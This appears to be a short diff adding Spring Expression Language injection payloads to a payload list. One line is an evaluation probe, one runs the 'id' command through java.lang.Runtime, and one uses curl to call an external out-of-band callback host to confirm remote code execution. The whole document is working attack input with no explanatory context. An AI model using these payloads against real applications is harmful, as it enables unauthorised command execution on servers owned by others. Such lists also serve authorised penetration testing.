@@ -1,0 +1,3 @@
+#{${7*7}}
+#{${T(java.lang.Runtime).getRuntime().exec('id')}}
+${T(java.lang.Runtime).getRuntime().exec('curl http://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/spel')}
